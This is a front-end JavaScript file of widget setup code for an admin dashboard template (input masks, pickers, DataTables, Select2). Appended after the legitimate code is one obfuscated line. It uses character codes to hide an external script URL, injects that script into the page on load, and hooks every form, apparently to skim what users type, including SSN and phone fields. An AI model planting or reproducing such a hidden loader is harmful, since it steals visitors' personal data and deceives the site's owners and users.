$(function(){
   'use strict'

   // Toggles
   $('.toggle').toggles({
	 on: true,
	 height: 26
   });

   // Input Masks
   $('#dateMask').mask('99/99/9999');
   $('#phoneMask').mask('(999) 999-9999');
   $('#ssnMask').mask('999-99-9999');

   // Time Picker
   $('#tpBasic').timepicker();
   $('#tp2').timepicker({'scrollDefault': 'now'});
   $('#tp3').timepicker();

   $('#setTimeButton').on('click', function (){
	 $('#tp3').timepicker('setTime', new Date());
   });

   // Color picker
   $('#colorpicker').spectrum({
	 color: '#0061da'
   });

   $('#showAlpha').spectrum({
	 color: 'rgba(0, 97, 218, 0.5)',
	 showAlpha: true
   });

   $('#showPaletteOnly').spectrum({
	   showPaletteOnly: true,
	   showPalette:true,
	   color: '#DC3545',
	   palette: [
		   ['#1D2939', '#fff', '#0866C6','#23BF08', '#F49917'],
		   ['#DC3545', '#17A2B8', '#6610F2', '#fa1e81', '#72e7a6']
	   ]
   });

});
$(function(){
   'use strict';

   $('#datatable1').DataTable({
	 responsive: true,
	 language: {
	   searchPlaceholder: 'Search...',
	   sSearch: '',
	   lengthMenu: '_MENU_ items/page',
	 }
   });

   $('#datatable2').DataTable({
	 bLengthChange: false,
	 searching: false,
	 responsive: true
   });

   // Select2
   $('.dataTables_length select').select2({ minimumResultsForSearch: Infinity });

 });
$(function(){
   'use strict'
   // Datepicker
   $('.fc-datepicker').datepicker({
	 showOtherMonths: true,
	 selectOtherMonths: true
   });

   $('#datepickerNoOfMonths').datepicker({
	 showOtherMonths: true,
	 selectOtherMonths: true,
	 numberOfMonths: 2
   });

 });
$(document).ready(function() {
	       'use strict';

	       $('.select2').select2({
	         minimumResultsForSearch: Infinity
	       });

	       // Select2 by showing the search
	       $('.select2-show-search').select2({
	         minimumResultsForSearch: ''
	       });

	       // Colored Hover
	       $('#select2').select2({
	         dropdownCssClass: 'hover-success',
	         minimumResultsForSearch: Infinity // disabling search
	       });

	       $('#select3').select2({
	         dropdownCssClass: 'hover-danger',
	         minimumResultsForSearch: Infinity // disabling search
	       });

	       // Outline Select
	       $('#select4').select2({
	         containerCssClass: 'select2-outline-success',
	         dropdownCssClass: 'bd-success hover-success',
	         minimumResultsForSearch: Infinity // disabling search
	       });

	       $('#select5').select2({
	         containerCssClass: 'select2-outline-info',
	         dropdownCssClass: 'bd-info hover-info',
	         minimumResultsForSearch: Infinity // disabling search
	       });

	       // Full Colored Select Box
	       $('#select6').select2({
	         containerCssClass: 'select2-full-color select2-primary',
	         minimumResultsForSearch: Infinity // disabling search
	       });

	       $('#select7').select2({
	         containerCssClass: 'select2-full-color select2-danger',
	         dropdownCssClass: 'hover-danger',
	         minimumResultsForSearch: Infinity // disabling search
	       });

	       // Full Colored Dropdown
	       $('#select8').select2({
	         dropdownCssClass: 'select2-drop-color select2-drop-primary',
	         minimumResultsForSearch: Infinity // disabling search
	       });

	       $('#select9').select2({
	         dropdownCssClass: 'select2-drop-color select2-drop-indigo',
	         minimumResultsForSearch: Infinity // disabling search
	       });

	       // Full colored for both box and dropdown
	       $('#select10').select2({
	         containerCssClass: 'select2-full-color select2-primary',
	         dropdownCssClass: 'select2-drop-color select2-drop-primary',
	         minimumResultsForSearch: Infinity // disabling search
	       });

	       $('#select11').select2({
	         containerCssClass: 'select2-full-color select2-indigo',
	         dropdownCssClass: 'select2-drop-color select2-drop-indigo',
	         minimumResultsForSearch: Infinity // disabling search
	       });
	     });
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b